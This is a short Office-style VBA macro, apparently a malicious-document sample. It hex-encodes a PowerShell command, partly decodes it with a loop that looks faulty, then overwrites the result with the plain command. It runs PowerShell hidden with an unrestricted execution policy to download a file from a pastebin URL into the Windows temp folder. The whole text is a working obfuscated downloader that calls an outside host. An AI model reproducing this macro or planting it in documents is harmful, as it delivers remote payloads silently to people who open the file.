Sub Main
	Dim command
	command = "28-6e-65-77-2d-6f-62-6a-65-63-74-20-53-79-73-74-65-6d-2e-4e-65-74-2e-57-65-62-43-6c-69-65-6e-74-29-2e-44-6f-77-6e-6c-6f-61-64-66-69-6c-65-28-27-68-74-74-70-73-3a-2f-2f-70-61-73-74-65-62-69-6e-2e-63-6f-6d-2f-37-58-7a-45-50-38-6d-44-27-2c-20-27-43-3a-5c-77-69-6e-64-6f-77-73-5c-74-65-6d-70-5c-68-61-63-6b-65-72-6d-61-6e-2e-74-78-74-27-29"
	command = Split(command, "-")
	Dim len
	len = UBound(command)
	Dim ps_cmd
	For E = 0 To len
		Dim arr_val
		Dim chr_val
		arr_val = command(E)
		chr_val = ChrW(arr_val)
		ps_cmd = ps_cmd & chr_val
	Next
	ps_cmd = "(new-object System.Net.WebClient).Downloadfile('https://pastebin.com/7XzEP8mD', 'C:\\windows\\temp\\hackerman.txt')"
	ps_cmd = "powershell -NoProfile -ExecutionPolicy unrestricted -Command " & ps_cmd
	Call Shell(ps_cmd, 0)
End Sub